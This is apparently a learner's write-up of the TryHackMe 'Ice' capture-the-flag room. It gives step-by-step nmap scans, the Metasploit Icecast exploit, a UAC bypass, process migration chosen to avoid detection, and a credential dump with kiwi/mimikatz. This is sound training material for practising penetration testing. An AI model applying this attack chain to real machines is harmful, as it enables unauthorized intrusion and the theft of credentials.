# ICE Room TryHackMe review.

## Tools i learnt in this challenge

1. nmap

2. metasploit

3. mimikatz - kiwi

## First Steps

- Performing a network scan to check open ports and determine entry route.
  
  - `nmap -A -T4 10.10.172.100`

- perform a vulnerability scan with nmap
  
  - `nmap --script vuln 10.10.172.100`

- The vuln scan gave me ms17-010 as vulnerable but that was for before, i can still see icecast and ms-rdp-server.
  
  - running a custom nmap script to check vulnerability in ms-rdp-server. `nmap -sV --script=rdp-vuln-ms12-020 -p 3389 10.10.172.100`
  
  - And the results are vulnerability present.

- Let me spool up msfconsole to check for potential exploits present.
  
  - in msfconsole `search ms12-020`
    
    - i get auxilliary scanner and dos, these are not exploits but rather provide more info about it.
  
  - let me search for icecast now `search icecast`.
    
    - i get an exploit for the icecast_header
  
  - let's use the new exploit `use 0` and provide all the necessary information needed `show options`, `set rhosts 10.10.172.100`
  
  - and we are now it, we can see that because of the `metepreter` meaning we have an active session.
  
  - We are in another users account, not in root.

- privilege escalation
  
  - we need to check which is the best exploit in order to gain privilege, we run 
    
    - `search exploit_suggester`
    
    - we get the result as `post/multi/recon/local_exploit_suggester`
    
    - for options we need to set, we need the session id of our meterpreter session. That we get by `sessions -l`, we then set the session `set session 1`
    
    - after running, we get the available exploits we can use for our mission. `exploit/windows/local/bypassuac_eventvwr`. we need to set the options `set session 1` and run it.
    
    - we have a second meterpreter session, by checking `getuid` we are still not root, but is we check `getprivs` we see we have expanded permissions allowing us to escalate.
    
    - to become root, we need to migrate into a service that has the permissions that we need to interact with lsass. any prcocess with 'NT AUTHORITY\SYSTEM' will work, but we have to choose a service that wont raise any flags.
    
    - we need to migrate the process in order to be root. `migrate -N spoolsv.exe`
    
    - when we run `getuid` we are root.
  
  - looting, to get passwords, we need mimikatz or rather kiwi which is the updates version. `load kiwi`
  
  - to retrieve all the credentials present, we use `creds_all`

- well the system if ours so simply typing `help` and we can do whatever we want with the machine.


